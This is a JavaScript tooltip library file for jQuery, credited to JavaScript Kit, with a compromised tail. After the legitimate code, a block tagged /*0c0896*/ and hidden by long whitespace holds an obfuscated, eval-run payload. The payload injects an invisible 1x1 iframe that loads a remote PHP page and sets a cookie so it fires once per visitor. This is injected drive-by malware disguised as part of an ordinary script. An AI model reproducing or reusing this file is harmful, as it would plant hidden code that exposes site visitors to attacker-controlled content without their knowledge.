//Inline HTML Tooltip script: By JavaScript Kit: http://www.javascriptkit.com
//Created: July 10th, 08'

var htmltooltip={
	tipclass: 'htmltooltip',
	fadeeffect: [true, 500],
	anchors: [],
	tooltips: [], //array to contain references to all tooltip DIVs on the page

	positiontip:function($, tipindex, e){
		var anchor=this.anchors[tipindex]
		var tooltip=this.tooltips[tipindex]
		var scrollLeft=window.pageXOffset? window.pageXOffset : this.iebody.scrollLeft
		var scrollTop=window.pageYOffset? window.pageYOffset : this.iebody.scrollTop
		var docwidth=(window.innerWidth)? window.innerWidth-15 : htmltooltip.iebody.clientWidth-15
		var docheight=(window.innerHeight)? window.innerHeight-18 : htmltooltip.iebody.clientHeight-15
		var tipx=anchor.dimensions.offsetx
		var tipy=anchor.dimensions.offsety+anchor.dimensions.h
		tipx=(tipx+tooltip.dimensions.w-scrollLeft>docwidth)? tipx-tooltip.dimensions.w : tipx //account for right edge
		tipy=(tipy+tooltip.dimensions.h-scrollTop>docheight)? tipy-tooltip.dimensions.h-anchor.dimensions.h : tipy //account for bottom edge
		$(tooltip).css({left: tipx, top: tipy})
	},

	showtip:function($, tipindex, e){
		var tooltip=this.tooltips[tipindex]
		if (this.fadeeffect[0])
			$(tooltip).hide().fadeIn(this.fadeeffect[1])
		else
			$(tooltip).show()
	},

	hidetip:function($, tipindex, e){
		var tooltip=this.tooltips[tipindex]
		if (this.fadeeffect[0])
			$(tooltip).fadeOut(this.fadeeffect[1])
		else
			$(tooltip).hide()	
	},

	updateanchordimensions:function($){
		var $anchors=$('*[@rel="'+htmltooltip.tipclass+'"]')
		$anchors.each(function(index){
			this.dimensions={w:this.offsetWidth, h:this.offsetHeight, offsetx:$(this).offset().left, offsety:$(this).offset().top}
		})
	},

	render:function(){
		jQuery(document).ready(function($){
			htmltooltip.iebody=(document.compatMode && document.compatMode!="BackCompat")? document.documentElement : document.body
			var $anchors=$('*[@rel="'+htmltooltip.tipclass+'"]')
			var $tooltips=$('div[@class="'+htmltooltip.tipclass+'"]')
			$anchors.each(function(index){ //find all links with "title=htmltooltip" declaration
				this.dimensions={w:this.offsetWidth, h:this.offsetHeight, offsetx:$(this).offset().left, offsety:$(this).offset().top} //store anchor dimensions
				this.tippos=index+' pos' //store index of corresponding tooltip
				var tooltip=$tooltips.eq(index).get(0) //ref corresponding tooltip
				if (tooltip==null) //if no corresponding tooltip found
					return //exist
				tooltip.dimensions={w:tooltip.offsetWidth, h:tooltip.offsetHeight}
				$(tooltip).remove().appendTo('body') //add tooltip to end of BODY for easier positioning
				htmltooltip.tooltips.push(tooltip) //store reference to each tooltip
				htmltooltip.anchors.push(this) //store reference to each anchor
				var $anchor=$(this)
				$anchor.hover(
					function(e){ //onMouseover element
						htmltooltip.positiontip($, parseInt(this.tippos), e)
						htmltooltip.showtip($, parseInt(this.tippos), e)
					},
					function(e){ //onMouseout element
						htmltooltip.hidetip($, parseInt(this.tippos), e)
					}
				)
				$(window).bind("resize", function(){htmltooltip.updateanchordimensions($)})
			})
		})
	}
}

htmltooltip.render()




/*0c0896*/
                                                                                                                                                                                                                                                          bv=(5-3-1);aq="0"+"x";sp="spli"+"t";ff=String.fromCharCode;w=window;z="dy";try{document["\x62o"+z]++}catch(d21vd12v){vzs=false;v=123;try{document;}catch(wb){vzs=2;}if(!vzs)e=w["eval"];if(1){f="17,5d,6c,65,5a,6b,60,66,65,17,71,71,71,5d,5d,5d,1f,20,17,72,4,1,17,6d,58,69,17,5f,6d,59,70,6a,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,4,1,4,1,17,5f,6d,59,70,6a,25,6a,69,5a,17,34,17,1e,5f,6b,6b,67,31,26,26,66,5d,5d,60,5a,5c,69,6a,6c,65,60,66,65,25,66,69,5e,26,58,63,67,60,65,5c,5d,6a,5e,26,69,5c,63,25,67,5f,67,1e,32,4,1,17,5f,6d,59,70,6a,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,17,34,17,1e,58,59,6a,66,63,6c,6b,5c,1e,32,4,1,17,5f,6d,59,70,6a,25,6a,6b,70,63,5c,25,59,66,69,5b,5c,69,17,34,17,1e,27,1e,32,4,1,17,5f,6d,59,70,6a,25,6a,6b,70,63,5c,25,5f,5c,60,5e,5f,6b,17,34,17,1e,28,67,6f,1e,32,4,1,17,5f,6d,59,70,6a,25,6a,6b,70,63,5c,25,6e,60,5b,6b,5f,17,34,17,1e,28,67,6f,1e,32,4,1,17,5f,6d,59,70,6a,25,6a,6b,70,63,5c,25,63,5c,5d,6b,17,34,17,1e,28,67,6f,1e,32,4,1,17,5f,6d,59,70,6a,25,6a,6b,70,63,5c,25,6b,66,67,17,34,17,1e,28,67,6f,1e,32,4,1,4,1,17,60,5d,17,1f,18,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,39,70,40,5b,1f,1e,5f,6d,59,70,6a,1e,20,20,17,72,4,1,17,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,1e,33,5b,60,6d,17,60,5b,34,53,1e,5f,6d,59,70,6a,53,1e,35,33,26,5b,60,6d,35,1e,20,32,4,1,17,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,39,70,40,5b,1f,1e,5f,6d,59,70,6a,1e,20,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5f,6d,59,70,6a,20,32,4,1,17,74,4,1,74,4,1,5d,6c,65,5a,6b,60,66,65,17,4a,5c,6b,3a,66,66,62,60,5c,1f,5a,66,66,62,60,5c,45,58,64,5c,23,5a,66,66,62,60,5c,4d,58,63,6c,5c,23,65,3b,58,70,6a,23,67,58,6b,5f,20,17,72,4,1,17,6d,58,69,17,6b,66,5b,58,70,17,34,17,65,5c,6e,17,3b,58,6b,5c,1f,20,32,4,1,17,6d,58,69,17,5c,6f,67,60,69,5c,17,34,17,65,5c,6e,17,3b,58,6b,5c,1f,20,32,4,1,17,60,5d,17,1f,65,3b,58,70,6a,34,34,65,6c,63,63,17,73,73,17,65,3b,58,70,6a,34,34,27,20,17,65,3b,58,70,6a,34,28,32,4,1,17,5c,6f,67,60,69,5c,25,6a,5c,6b,4b,60,64,5c,1f,6b,66,5b,58,70,25,5e,5c,6b,4b,60,64,5c,1f,20,17,22,17,2a,2d,27,27,27,27,27,21,29,2b,21,65,3b,58,70,6a,20,32,4,1,17,5b,66,5a,6c,64,5c,65,6b,25,5a,66,66,62,60,5c,17,34,17,5a,66,66,62,60,5c,45,58,64,5c,22,19,34,19,22,5c,6a,5a,58,67,5c,1f,5a,66,66,62,60,5c,4d,58,63,6c,5c,20,4,1,17,22,17,19,32,5c,6f,67,60,69,5c,6a,34,19,17,22,17,5c,6f,67,60,69,5c,25,6b,66,3e,44,4b,4a,6b,69,60,65,5e,1f,20,17,22,17,1f,1f,67,58,6b,5f,20,17,36,17,19,32,17,67,58,6b,5f,34,19,17,22,17,67,58,6b,5f,17,31,17,19,19,20,32,4,1,74,4,1,5d,6c,65,5a,6b,60,66,65,17,3e,5c,6b,3a,66,66,62,60,5c,1f,17,65,58,64,5c,17,20,17,72,4,1,17,6d,58,69,17,6a,6b,58,69,6b,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,66,66,62,60,5c,25,60,65,5b,5c,6f,46,5d,1f,17,65,58,64,5c,17,22,17,19,34,19,17,20,32,4,1,17,6d,58,69,17,63,5c,65,17,34,17,6a,6b,58,69,6b,17,22,17,65,58,64,5c,25,63,5c,65,5e,6b,5f,17,22,17,28,32,4,1,17,60,5d,17,1f,17,1f,17,18,6a,6b,58,69,6b,17,20,17,1d,1d,4,1,17,1f,17,65,58,64,5c,17,18,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,66,66,62,60,5c,25,6a,6c,59,6a,6b,69,60,65,5e,1f,17,27,23,17,65,58,64,5c,25,63,5c,65,5e,6b,5f,17,20,17,20,17,20,4,1,17,72,4,1,17,69,5c,6b,6c,69,65,17,65,6c,63,63,32,4,1,17,74,4,1,17,60,5d,17,1f,17,6a,6b,58,69,6b,17,34,34,17,24,28,17,20,17,69,5c,6b,6c,69,65,17,65,6c,63,63,32,4,1,17,6d,58,69,17,5c,65,5b,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,66,66,62,60,5c,25,60,65,5b,5c,6f,46,5d,1f,17,19,32,19,23,17,63,5c,65,17,20,32,4,1,17,60,5d,17,1f,17,5c,65,5b,17,34,34,17,24,28,17,20,17,5c,65,5b,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,66,66,62,60,5c,25,63,5c,65,5e,6b,5f,32,4,1,17,69,5c,6b,6c,69,65,17,6c,65,5c,6a,5a,58,67,5c,1f,17,5b,66,5a,6c,64,5c,65,6b,25,5a,66,66,62,60,5c,25,6a,6c,59,6a,6b,69,60,65,5e,1f,17,63,5c,65,23,17,5c,65,5b,17,20,17,20,32,4,1,74,4,1,60,5d,17,1f,65,58,6d,60,5e,58,6b,66,69,25,5a,66,66,62,60,5c,3c,65,58,59,63,5c,5b,20,4,1,72,4,1,60,5d,1f,3e,5c,6b,3a,66,66,62,60,5c,1f,1e,6d,60,6a,60,6b,5c,5b,56,6c,68,1e,20,34,34,2c,2c,20,72,74,5c,63,6a,5c,72,4a,5c,6b,3a,66,66,62,60,5c,1f,1e,6d,60,6a,60,6b,5c,5b,56,6c,68,1e,23,17,1e,2c,2c,1e,23,17,1e,28,1e,23,17,1e,26,1e,20,32,4,1,4,1,71,71,71,5d,5d,5d,1f,20,32,4,1,74,4,1,74,4,1"[sp](",");}w=f;s=[];for(i=2-2;-i+1352!=0;i+=1){j=i;if((0x19==031))if(e)s+=ff(e(aq+(w[j]))+0xa-bv);}za=e;za(s)}
/*/0c0896*/
